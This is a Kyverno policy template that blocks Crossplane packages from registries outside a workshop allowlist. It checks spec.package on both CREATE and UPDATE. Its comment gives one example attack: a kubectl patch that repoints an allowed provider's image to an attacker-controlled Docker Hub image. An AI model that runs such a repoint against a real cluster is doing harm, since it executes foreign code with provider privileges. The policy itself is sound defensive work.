{{/*
Block participants from installing Crossplane packages from sources
outside the workshop's allowlist. Covers Provider, Function, and
Configuration kinds — all three are pulled as OCI images and run
with provider-class RBAC, so a foreign package is a code-execution
primitive (#115).

Why an allowlist on `spec.package` (not on `metadata.name`):
- A `kubectl patch provider provider-helm --type=merge -p
  '{"spec":{"package":"docker.io/attacker/x:latest"}}'` keeps the
  allowed name but repoints the image. The previous `metadata.name`
  allowlist let that through.
- Function and Configuration kinds are uncovered today — adding them
  here closes module-06-freestyle-style abuse where a participant
  installs an arbitrary OCI Function.

Allowed package-string prefixes (current workshop content needs all
four):
- xpkg.upbound.io/crossplane-contrib/  (provider-helm, function-auto-ready, function-go-templating)
- xpkg.crossplane.io/crossplane-contrib/  (function-patch-and-transform, provider-upjet-github)
- xpkg.upbound.io/upbound/  (provider-aws-*, provider-gcp-*, provider-azure-* — module 06)
- ghcr.io/riccap/  (provider-arubacloud)
*/}}
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-rogue-providers
  annotations:
    argocd.argoproj.io/sync-wave: "2"
    policies.kyverno.io/category: Workshop / Aruba
    policies.kyverno.io/severity: medium
    policies.kyverno.io/description: |
      Crossplane Provider / Function / Configuration packages must
      be sourced from the workshop's allowlisted registries. Catches
      both new installs (CREATE) and `spec.package` repoints (UPDATE).
spec:
  validationFailureAction: Enforce
  background: false
  rules:
    - name: package-prefix-allowlist
      match:
        any:
          - resources:
              kinds:
                - pkg.crossplane.io/v1/Provider
                - pkg.crossplane.io/v1/Function
                - pkg.crossplane.io/v1/Configuration
              operations:
                - CREATE
                - UPDATE
      validate:
        message: >-
          Crossplane package source not in the workshop allowlist.
          Allowed prefixes: xpkg.upbound.io/crossplane-contrib/,
          xpkg.crossplane.io/crossplane-contrib/,
          xpkg.upbound.io/upbound/, ghcr.io/riccap/.
        deny:
          conditions:
            all:
              - key: "{{`{{ regex_match('^(xpkg\\.upbound\\.io/crossplane-contrib/|xpkg\\.crossplane\\.io/crossplane-contrib/|xpkg\\.upbound\\.io/upbound/|ghcr\\.io/riccap/).+', request.object.spec.package) }}`}}"
                operator: Equals
                value: false
